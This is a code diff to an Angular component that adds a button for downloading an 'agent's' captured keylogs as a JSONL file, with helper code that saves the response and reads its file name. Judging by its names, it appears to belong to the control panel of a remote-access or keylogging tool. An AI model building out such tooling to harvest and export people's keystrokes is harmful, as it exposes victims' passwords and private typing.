@@ -1,5 +1,7 @@
 import { Component, OnInit, ChangeDetectorRef } from '@angular/core';
 import { ActivatedRoute } from '@angular/router';
+import { HttpResponse } from '@angular/common/http';
+import { finalize } from 'rxjs';
 import { KeylogService } from '../../../core/services/keylog.service';
 import { AgentService } from '../../../core/services/agent.service';
 import { Keylog, KeylogFilters } from '../../../core/models/keylog.model';
@@ -17,6 +19,7 @@ export class AgentKeylogsComponent implements OnInit {
   keylogs: Keylog[] = [];
   total = 0;
   loading = true;
+  downloading = false;
 
   limit = 50;
   offset = 0;
@@ -78,5 +81,52 @@ export class AgentKeylogsComponent implements OnInit {
     this.typeFilter = '';
     this.dateRange = null;
     this.applyFilters();
+  }
+
+  download(): void {
+    if (!this.agentId || this.downloading) return;
+
+    this.downloading = true;
+    this.keylogService
+      .downloadKeylogs(this.agentId)
+      .pipe(
+        finalize(() => {
+          this.downloading = false;
+          this.cdr.detectChanges();
+        })
+      )
+      .subscribe({
+        next: (response) => {
+          this.saveBlobResponse(response, `${this.agentId}_keylogs.jsonl`);
+        },
+        error: () => {
+          console.error('Failed to download keylogs');
+        },
+      });
+  }
+
+  private saveBlobResponse(response: HttpResponse<Blob>, fallbackFileName: string): void {
+    if (!response.body) return;
+
+    const contentDisposition = response.headers.get('content-disposition');
+    const fileName = this.extractFileName(contentDisposition) ?? fallbackFileName;
+    const objectUrl = URL.createObjectURL(response.body);
+    const link = document.createElement('a');
+    link.href = objectUrl;
+    link.download = fileName;
+    link.click();
+    URL.revokeObjectURL(objectUrl);
+  }
+
+  private extractFileName(contentDisposition: string | null): string | null {
+    if (!contentDisposition) return null;
+
+    const utf8Match = contentDisposition.match(/filename\*=UTF-8''([^;]+)/i);
+    if (utf8Match?.[1]) {
+      return decodeURIComponent(utf8Match[1]);
+    }
+
+    const plainMatch = contentDisposition.match(/filename="?([^";]+)"?/i);
+    return plainMatch?.[1] ?? null;
   }
 }
